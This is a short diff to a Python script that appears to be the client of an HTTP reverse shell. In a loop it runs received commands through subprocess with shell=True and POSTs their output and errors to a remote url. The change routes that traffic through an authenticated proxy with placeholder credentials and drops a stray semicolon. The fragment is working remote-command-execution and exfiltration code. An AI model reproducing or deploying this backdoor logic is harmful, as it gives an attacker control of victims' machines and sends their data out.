@@ -14,7 +14,7 @@ while True:
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        post_response = requests.post(url=url,data=CMD.stdout.read())
-        post_response = requests.post(url=url, data=CMD.stderr.read())
+        post_response = requests.post(url=url,  proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stdout.read())
+        post_response = requests.post(url=url, proxies={'http': "http://usrname:password@proxyserverIP:port"}, data=CMD.stderr.read())
 
-    time.sleep(3);
+    time.sleep(3)
